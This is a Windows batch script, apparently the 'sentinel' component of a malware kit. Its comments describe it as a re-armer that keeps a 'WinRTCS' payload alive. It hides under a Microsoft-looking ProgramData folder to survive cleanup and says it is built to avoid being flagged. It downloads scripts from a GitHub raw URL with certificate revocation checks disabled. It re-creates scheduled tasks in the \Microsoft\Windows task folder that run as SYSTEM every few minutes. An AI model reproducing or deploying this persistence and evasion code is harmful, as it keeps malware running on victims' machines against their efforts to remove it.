@echo off
rem WINRTCS_SENTINEL S1 - third re-armer (C19). Dormant 15-min check, sole job: if the
rem WinRTCS task pair or core files are gone, restore them - from the resurrection cache
rem first (no network), repo second. Lives in the cache dir, NOT the main dir, so it
rem survives a wipe of C:\ProgramData\WinRTCS and the \Microsoft\Windows\WinRTCS task folder.
rem It never touches gryxa, never runs payloads: minimal surface, minimal reason to be flagged.
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "ACT=cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_run.cmd"
set "SACT=cmd.exe /c C:\ProgramData\Microsoft\WinRTCS\cache\winrtcs_sentinel.cmd"
set "LOG=%CD%\sentinel.log"
if not exist "%CD%" mkdir "%CD%" >nul 2>&1
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1

rem --- seed the cache itself from repo if a sweep emptied it ---
if not exist "%CD%\winrtcs_run.cmd" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%CD%\run.dl" "%BASE%/winrtcs_run.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
  if exist "%CD%\run.dl" findstr /C:"WINRTCS_RUN" "%CD%\run.dl" >nul 2>&1 && move /y "%CD%\run.dl" "%CD%\winrtcs_run.cmd" >nul 2>&1
  del /f /q "%CD%\run.dl" >nul 2>&1
)
if not exist "%CD%\winrtcs_agent.cmd" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 25 -o "%CD%\agent.dl" "%BASE%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
  if exist "%CD%\agent.dl" findstr /C:"WINRTCS_AGENT" "%CD%\agent.dl" >nul 2>&1 && move /y "%CD%\agent.dl" "%CD%\winrtcs_agent.cmd" >nul 2>&1
  del /f /q "%CD%\agent.dl" >nul 2>&1
)

rem --- restore core files into the main dir from the cache ---
if not exist "%ZD%\winrtcs_run.cmd" if exist "%CD%\winrtcs_run.cmd" copy /y "%CD%\winrtcs_run.cmd" "%ZD%\winrtcs_run.cmd" >nul 2>&1
if not exist "%ZD%\winrtcs_agent.cmd" if exist "%CD%\winrtcs_agent.cmd" copy /y "%CD%\winrtcs_agent.cmd" "%ZD%\winrtcs_agent.cmd" >nul 2>&1

rem --- re-arm the pair; the agent hash-pins and repairs anything stale from here ---
schtasks /Query /TN "\Microsoft\Windows\WinRTCS\Agent" >nul 2>&1
if errorlevel 1 schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Agent" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Query /TN "\Microsoft\Windows\WinRTCS\Guard" >nul 2>&1
if errorlevel 1 schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Guard" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1

rem --- re-arm self ---
schtasks /Query /TN "\WinRTCSSentinel" >nul 2>&1
if errorlevel 1 schtasks /Create /TN "\WinRTCSSentinel" /TR "%SACT%" /SC MINUTE /MO 15 /RU SYSTEM /RL HIGHEST /F >nul 2>&1

echo [%DATE% %TIME%] sentinel_tick>>"%LOG%"
if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 65536 move /y "%LOG%" "%LOG%.old" >nul 2>&1
endlocal & exit /b 0
